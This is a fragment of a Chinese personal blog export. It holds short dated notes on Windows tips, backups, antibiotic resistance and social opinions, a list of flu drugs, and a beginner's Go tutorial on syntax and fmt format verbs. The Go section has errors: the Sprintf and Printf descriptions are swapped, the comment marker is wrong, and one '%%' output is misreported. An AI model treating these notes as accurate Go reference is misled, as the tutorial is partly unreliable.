href="https://weibo.com/6827625527/5044845913835326,https://weibo.com/6827625527/5086503290018903%EF%BC%89%E3%80%82%E5%8F%AA%E6%9C%89%E5%BD%93%E6%97%B6%E7%9A%84">https://weibo.com/6827625527/5044845913835326,https://weibo.com/6827625527/5086503290018903）。只有当时的</a> DeepSeek 2.5 和另外一个能完成。</p><p><img src="/image-20241230102036305.png" alt="image-20241230102036305"></p><p><a href="https://weibo.com/6827625527/5116900397026163">https://weibo.com/6827625527/5116900397026163</a></p><h2 id="2024-12-29-2"><a href="#2024-12-29-2" class="headerlink" title="2024.12.29"></a>2024.12.29</h2><p>我有个亲戚是机长。他曾遇到过和东方航空 5510 空难一样的引擎故障，不过那次他把飞机救回来了，平安降落。</p><p>可想而知，当时飞机肯定是忽上忽下，扭来扭去。所以乘客都在骂飞行员。但这时候又不能告诉乘客发生了什么，要不然大家一慌乱，更麻烦。降落后，乘客们知道了真相，又全都跑来感谢飞行员，感谢救命之恩。</p><p>我经常思考这件事。</p><p><img src="/image-20241230101127318.png" alt="image-20241230101127318"></p><p><a href="https://weibo.com/6827625527/5116909603263506">https://weibo.com/6827625527/5116909603263506</a></p><h2 id="2024-12-31"><a href="#2024-12-31" class="headerlink" title="2024.12.31"></a>2024.12.31</h2><p>所有 Windows 版本都通用的就是 Print Screen 截全屏以及  Alt + Print Screen 截当前窗口。Windows 10&#x2F;11 支持更高级的截屏方式，可以自选截屏区域。按 Win + Shift + S 即可启动该功能。具体可参考：<a href="https://support.microsoft.com/zh-cn/windows/%E4%BD%BF%E7%94%A8%E6%88%AA%E5%9B%BE%E5%B7%A5%E5%85%B7%E6%8D%95%E8%8E%B7%E6%88%AA%E5%9B%BE-00246869-1843-655f-f220-97299b865f6b">https://support.microsoft.com/zh-cn/windows/%E4%BD%BF%E7%94%A8%E6%88%AA%E5%9B%BE%E5%B7%A5%E5%85%B7%E6%8D%95%E8%8E%B7%E6%88%AA%E5%9B%BE-00246869-1843-655f-f220-97299b865f6b</a></p><p>不过以上这些截屏方式都是把截取的内容存在剪贴板。如果希望直接把截屏存为文件，可以用 Windows 自带的 Game Bar 截屏，Win + Alt + Print Screen，截屏会自动存储到用户目录的 Videos\Captures。</p><p>另外，Game Bar 还可以录制屏幕录像，Win + Alt + R 即可启动，同样保存在用户目录的 Videos\Captures。也就是说，在 Windows 10&#x2F;11 上录制屏幕录像并不需要依赖第三方软件。</p><p><img src="/image-20250102102222115.png" alt="image-20250102102222115"></p><p><a href="https://weibo.com/6827625527/5117661363832958">https://weibo.com/6827625527/5117661363832958</a></p><h2 id="2024-12-31-1"><a href="#2024-12-31-1" class="headerlink" title="2024.12.31"></a>2024.12.31</h2><p>二战期间，大批美国妇女走出家门，参与社会生产，这是战后美国妇女解放运动的基础。新中国成立后，作为轻工业中心的上海，妇女在工厂里加班加点生产纺织产品、日化产品等物资，支援全国，从而催生了上海男人做饭的传统。</p><p>农业文明时代，女性的体力劣势是地位低下的根本原因。在这样的背景下，无论怎么争取，最多只能诞生个别的武则天和慈禧，不可能实现广泛意义的妇女解放。从目前的情况看，人工智能会进一步消除男性和女性在脑力劳动上的生产力差异，甚至更加能发挥女性语言能力强的优势。所以女性应该积极拥抱人工智能。</p><p><img src="/image-20250102102706206.png" alt="image-20250102102706206"></p><p><a href="https://weibo.com/6827625527/5117635790113673">https://weibo.com/6827625527/5117635790113673</a></p><h1 id="2025"><a href="#2025" class="headerlink" title="2025"></a>2025</h1><h2 id="2025-1-1"><a href="#2025-1-1" class="headerlink" title="2025.1.1"></a>2025.1.1</h2><p>查了一下，现在国内的肺炎链球菌对不少抗生素都耐药，对阿奇霉素等大环内酯类抗生素耐药率更是都超过 95% 了。</p><p>明年肺炎链球菌疫苗我也得去打。 </p><p><img src="/image-20250102101437659.png" alt="image-20250102101437659"></p><p><a href="https://weibo.com/6827625527/5118114278677435">https://weibo.com/6827625527/5118114278677435</a></p><h2 id="2025-1-1-1"><a href="#2025-1-1-1" class="headerlink" title="2025.1.1"></a>2025.1.1</h2><p>我很喜欢的一个作家，大概在他 30 岁的时候，就表达了这样一个观点：他明白自己人指望不了，外国人指望不上，所以他喜欢科幻，因为在科幻里至少还可以指望外星人。于是我知道在那时候他就已经杀死了自己的慈父，杀死了自己的神，成为了一个孤独而自由的人。</p><p>那时他已经比较出名，所以发出上面那个观点后很快又删掉了。之后他越来越出名，也就再没有发表过类似观点，其实是没再发表过任何观点。他只是在每部作品里巧妙地不露痕迹地不留把柄地讲着一个个故事。</p><p><img src="/image-20250102161606017.png" alt="image-20250102161606017"></p><p><a href="https://weibo.com/6827625527/P7IGArxUX">https://weibo.com/6827625527/P7IGArxUX</a></p><h2 id="2025-1-10"><a href="#2025-1-10" class="headerlink" title="2025.1.10"></a>2025.1.10</h2><p>有的公司产品质量好，服务到位，客户口碑好，那你就做它的客户。<br>有的公司待遇好，文化宽松，员工满意度高，那你就去那里工作。<br>有的公司增长稳定，财报漂亮，股东回报好，那你就买它的股票。</p><p>但只是看到产品质量好，于是激动地去投简历或者买股票，这种判断就是基于情感（及其导致的混乱思维）而非逻辑。</p><p><img src="/image-20250110201739872.png" alt="image-20250110201739872"></p><p><a href="https://weibo.com/6827625527/P8Xvk9m0G">https://weibo.com/6827625527/P8Xvk9m0G</a></p><h2 id="2025-2-15"><a href="#2025-2-15" class="headerlink" title="2025.2.15"></a>2025.2.15</h2><p>我以前存储备份小文件都是打包成 TAR 或者不压缩的 ZIP。成千上万个小文件变成一个大文件之后，拷贝速度会得到巨大提高。</p><p>不过虚拟磁盘可能是更好的办法。VHD 是 Windows 原生支持的格式，用系统自带的磁盘管理器即可创建，双击即可挂载。创建一个动态扩展的 VHD 虚拟磁盘，挂载后把小文件丢进去就行。这个办法除了不依赖第三方工具，而且对文件进行访问也很方便。</p><p><img src="/image-20250216094719968.png" alt="image-20250216094719968"></p><p><a href="https://weibo.com/6827625527/5134424874158990">https://weibo.com/6827625527/5134424874158990</a></p><h2 id="2025-2-15-1"><a href="#2025-2-15-1" class="headerlink" title="2025.2.15"></a>2025.2.15</h2><p>Windows 没有自带的创建光盘镜像的工具。不过 Windows ADK（Assessment and Deployment Kit）里有一个命令行工具 oscdimg。</p><p><img src="/image-20250216150107642.png" alt="image-20250216150107642"></p><p><a href="https://weibo.com/6827625527/5134387830066722">https://weibo.com/6827625527/5134387830066722</a></p><h2 id="2025-2-16"><a href="#2025-2-16" class="headerlink" title="2025.2.16"></a>2025.2.16</h2><p>store.rg-adguard.net 这个网站提供了获取微软应用商店程序直接下载链接的能力。</p><p>由于微软应用商店下架的程序只是“下架”，但“库存”还在，所以，即便已下架的程序，只要知道原来的网页链接，也可以用这个网站获得“库存”链接，下载到程序。 </p><p><img src="/image-20250216145853911.png" alt="image-20250216145853911"></p><p><a href="https://weibo.com/6827625527/5134617848055647">https://weibo.com/6827625527/5134617848055647</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>tk</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>tk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>life_yl</title>
    <link href="/2024/12/24/life/life_yl/"/>
    <url>/2024/12/24/life/life_yl/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="流感"><a href="#流感" class="headerlink" title="流感"></a>流感</h3><p>罗氏出品-玛巴洛沙韦干混悬剂：5 岁以上都可以用</p><p>罗氏出品-速福达</p><p>来自TK茧房群</p>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
      <category>yiliao</category>
      
    </categories>
    
    
    <tags>
      
      <tag>life</tag>
      
      <tag>yiliao</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang_base</title>
    <link href="/2024/12/24/dev/golang/golang_base/"/>
    <url>/2024/12/24/dev/golang/golang_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>官方网址</p><p>go.dev&#x2F;dl&#x2F;</p><p>golang.org&#x2F;dl&#x2F;</p><h2 id="安装注意事项"><a href="#安装注意事项" class="headerlink" title="安装注意事项"></a>安装注意事项</h2><h3 id="解压到指定目录"><a href="#解压到指定目录" class="headerlink" title="解压到指定目录"></a>解压到指定目录</h3><p>源码解压到&#x2F;usr&#x2F;local</p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>vim ~&#x2F;.bashrc</p><p>export GOROOT&#x3D;&#x2F;usr&#x2F;local&#x2F;go</p><p>export GOPATH&#x3D;$HOME&#x2F;go</p><p>export PATH&#x3D;$PATH:$GOROOT&#x2F;bin:$GOPATH&#x2F;bin</p><p>GOROOT  go语言源码包所在位置</p><p>GOPATH   开发者GO项目的默认路径，也就是代码路径</p><h2 id="语言结构"><a href="#语言结构" class="headerlink" title="语言结构"></a>语言结构</h2><h3 id="基础组成"><a href="#基础组成" class="headerlink" title="基础组成"></a>基础组成</h3><h4 id="包声明"><a href="#包声明" class="headerlink" title="包声明"></a>包声明</h4><p>必须在非注释的第一行表明文件属于哪个包，例如：package main</p><p>package main 表示该文件是可独立执行的程序，每个Go应用程序都包含一个名为 main 的包</p><h4 id="引入包"><a href="#引入包" class="headerlink" title="引入包"></a>引入包</h4><p>import “包名”</p><p>import “fmt”，告诉程序需要使用 fmt 包，fmt 包实现了格式化IO（输入&#x2F;输出）的函数</p><p>多个包引入</p><p>import (</p><p>​“fmt”</p><p>​“time”</p><p>)</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>func 函数名()</p><p>func main()</p><p>main 函数是每个可执行程序必须包含的，也是一般情况下程序启动后第一个执行的函数（如果程序中包含 init 函数，将会先执行 init 函数）</p><p>函数体的左大括号必须和函数名在同行，不可换行在另一行或者单独成行，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//this is first demo code</span><br>fmt.Println(<span class="hljs-string">&quot;this is main func&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;this is init func&quot;</span>)<br>&#125;<br><br><br>➜  gocode <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br>this is init <span class="hljs-function"><span class="hljs-keyword">func</span></span><br>this is main <span class="hljs-function"><span class="hljs-keyword">func</span></span><br></code></pre></td></tr></table></figure><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><h4 id="语句-表达式"><a href="#语句-表达式" class="headerlink" title="语句&amp;表达式"></a>语句&amp;表达式</h4><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>单行注释：“\”的行</p><p>多行注释，块注释，不可嵌套使用</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">/* 开头</span><br><span class="hljs-comment">*/</span> 结尾<br></code></pre></td></tr></table></figure><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h3><p>GO程序可以由多个标记构成，标记可以是关键词、标识符、常量、字符串、符号等</p><h3 id="行分隔符"><a href="#行分隔符" class="headerlink" title="行分隔符"></a>行分隔符</h3><p>每一行代表一个语句结束，不需要分号结尾</p><p>如果将多个语句写入一行，每个语句就需要以分号分隔</p><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>用来命名变量、类型等程序实体</p><p>标识符规定：大小写字母、数字和下划线组成，必须以字母或者下划线开头，不能以数字开头Go语言关键字</p><h3 id="字符串连接符"><a href="#字符串连接符" class="headerlink" title="字符串连接符"></a>字符串连接符</h3><p>通过 + 进行字符串的连接</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function">func <span class="hljs-title">init</span>()</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;this is init func&quot;</span> + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-string">&quot;字符串连接符测试&quot;</span>)<br>&#125;<br><br>➜  gocode go run hello.go<br><span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">init</span> func 字符串连接符测试<br></code></pre></td></tr></table></figure><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><h4 id="25个关键字或保留字"><a href="#25个关键字或保留字" class="headerlink" title="25个关键字或保留字"></a>25个关键字或保留字</h4><h5 id="break"><a href="#break" class="headerlink" title="break"></a><strong>break</strong></h5><p>用于跳出循环，常和 for 循环或 switch 语句使用</p><h5 id="default"><a href="#default" class="headerlink" title="default"></a><strong>default</strong></h5><p>循环默认选项，用在switch和select语句中</p><h5 id="func"><a href="#func" class="headerlink" title="func"></a><strong>func</strong></h5><p>函数定义</p><h5 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h5><p>定义接口</p><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p>通道控制结构，类似 switch，作用对象为通道操作（发送或接收）</p><h5 id="case"><a href="#case" class="headerlink" title="case"></a>case</h5><p>用在switch语句之中，表示其中的一个分支</p><h5 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h5><p>延迟执行，函数的收尾工作，在函数结束前执行</p><h5 id="go"><a href="#go" class="headerlink" title="go"></a>go</h5><p>并发</p><h5 id="map"><a href="#map" class="headerlink" title="map"></a>map</h5><p>map结构类型</p><h5 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h5><p>定义结构体</p><h5 id="chan"><a href="#chan" class="headerlink" title="chan"></a>chan</h5><p>定义 channel</p><h5 id="else"><a href="#else" class="headerlink" title="else"></a>else</h5><p>用在条件语句中，表明当条件不成立时的分支</p><h5 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h5><p>跳转语句</p><h5 id="package"><a href="#package" class="headerlink" title="package"></a>package</h5><p>包</p><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><p>分支语句结构的引导词</p><h5 id="const"><a href="#const" class="headerlink" title="const"></a>const</h5><p>声明常量</p><h5 id="fallthrough"><a href="#fallthrough" class="headerlink" title="fallthrough"></a>fallthrough</h5><p>如果case带有fallthrough，程序会继续执行下一条case,不会再判断下一条case的值</p><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><p>条件语句的判断</p><h5 id="range"><a href="#range" class="headerlink" title="range"></a>range</h5><p>从slice、map等结构中取元素</p><h5 id="type"><a href="#type" class="headerlink" title="type"></a>type</h5><p>定义类型</p><h5 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h5><p>回到一次循环的开始处</p><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><p>for 循环</p><p>import</p><p>引入指定的包或类</p><h5 id="return"><a href="#return" class="headerlink" title="return"></a>return</h5><p>从方法中返回</p><h5 id="var"><a href="#var" class="headerlink" title="var"></a>var</h5><p>声明变量</p><h4 id="36-个预定义标识"><a href="#36-个预定义标识" class="headerlink" title="36 个预定义标识"></a>36 个预定义标识</h4><table><thead><tr><th align="left">append</th><th align="left">bool</th><th align="left">byte</th><th align="left">cap</th><th align="left">close</th><th align="left">complex</th><th align="left">complex64</th><th align="left">complex128</th><th align="left">uint16</th></tr></thead><tbody><tr><td align="left">copy</td><td align="left">false</td><td align="left">float32</td><td align="left">float64</td><td align="left">imag</td><td align="left">int</td><td align="left">int8</td><td align="left">int16</td><td align="left">uint32</td></tr><tr><td align="left">int32</td><td align="left">int64</td><td align="left">iota</td><td align="left">len</td><td align="left">make</td><td align="left">new</td><td align="left">nil</td><td align="left">panic</td><td align="left">uint64</td></tr><tr><td align="left">print</td><td align="left">println</td><td align="left">real</td><td align="left">recover</td><td align="left">string</td><td align="left">true</td><td align="left">uint</td><td align="left">uint8</td><td align="left">uintptr</td></tr></tbody></table><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><h4 id="fmt-Sprintf"><a href="#fmt-Sprintf" class="headerlink" title="fmt.Sprintf"></a>fmt.Sprintf</h4><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><p>fmt.Sprintf(格式化样式, 参数列表…)</p><p>格式化样式：字符串形式，格式化符号以 % 开头， %s 字符串格式，%d 十进制的整数格式</p><p>参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</p><p>根据格式化参数生成格式化的字符串并写入标准输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> inttype = <span class="hljs-number">123</span><br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%d&amp;str=%s&quot;</span><br><span class="hljs-keyword">var</span> spliceresult = fmt.Sprintf(splice, inttype, stringtype)<br>fmt.Println(spliceresult)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">123</span>&amp;str=test<br></code></pre></td></tr></table></figure><h4 id="fmt-Printf"><a href="#fmt-Printf" class="headerlink" title="fmt.Printf"></a>fmt.Printf</h4><p>根据格式化参数生成格式化的字符串并返回该字符串</p><h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><p>fmt.Printf(格式化样式, 参数列表…)</p><p>格式化样式：字符串形式，格式化符号以 % 开头， %s 字符串格式，%d 十进制的整数格式。<br>参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</p><h4 id="字符串格式化符号"><a href="#字符串格式化符号" class="headerlink" title="字符串格式化符号"></a>字符串格式化符号</h4><h5 id="v"><a href="#v" class="headerlink" title="%v"></a>%v</h5><p>按照值的本来值输出</p><h5 id="v-1"><a href="#v-1" class="headerlink" title="%+v"></a>%+v</h5><p>在 %v 基础上，对结构体字段名和值进行展开</p><h5 id="v-2"><a href="#v-2" class="headerlink" title="%#v"></a>%#v</h5><p>输出 Go 语言语法格式的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> inttype = <span class="hljs-number">123</span><br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%b&amp;str=%#v&quot;</span><br>result := fmt.Sprintf(splice, inttype, stringtype)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">1111011</span>&amp;str=<span class="hljs-string">&quot;test&quot;</span>% <br></code></pre></td></tr></table></figure><h5 id="T"><a href="#T" class="headerlink" title="%T"></a>%T</h5><p>输出 Go 语言语法格式的类型和值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;str=%T&quot;</span><br>result := fmt.Sprintf(splice, stringtype)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br>str=<span class="hljs-type">string</span>%     <br></code></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title="%%"></a>%%</h5><p>输出 %</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;str=%%&quot;</span><br>result := fmt.Sprintf(splice)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br>str=%%    <br></code></pre></td></tr></table></figure><h5 id="b"><a href="#b" class="headerlink" title="%b"></a>%b</h5><p>整型以二进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%b&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">1000010</span>%   <br></code></pre></td></tr></table></figure><h5 id="o"><a href="#o" class="headerlink" title="%o"></a>%o</h5><p>整型以八进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%o&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">102</span>%   <br></code></pre></td></tr></table></figure><h5 id="d"><a href="#d" class="headerlink" title="%d"></a>%d</h5><p>整型以十进制方式显示</p><h5 id="x"><a href="#x" class="headerlink" title="%x"></a>%x</h5><p>整型以十六进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%x&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span> <br><span class="hljs-type">int</span>=<span class="hljs-number">42</span>% <br></code></pre></td></tr></table></figure><h5 id="X"><a href="#X" class="headerlink" title="%X"></a>%X</h5><p>整型以十六进制方式显示，显示中的字母为大写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%x&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=a2c2a%  <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%X&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=A2C2A%  <br></code></pre></td></tr></table></figure><h5 id="U"><a href="#U" class="headerlink" title="%U"></a>%U</h5><p>Unicode字符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%U&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=U+A2C2A%   <br></code></pre></td></tr></table></figure><h5 id="f"><a href="#f" class="headerlink" title="%f"></a>%f</h5><p>浮点数</p><p>%.2f，小数点后两位精度</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">6.66666</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%f&quot;</span><br> <span class="hljs-keyword">var</span> splice1 = <span class="hljs-string">&quot;\nint=%.2f&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br> result1 := fmt.Sprintf(splice1, inttype)<br> io.WriteString(os.Stdout, result1)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">6.666660</span><br><span class="hljs-type">int</span>=<span class="hljs-number">6.67</span>%   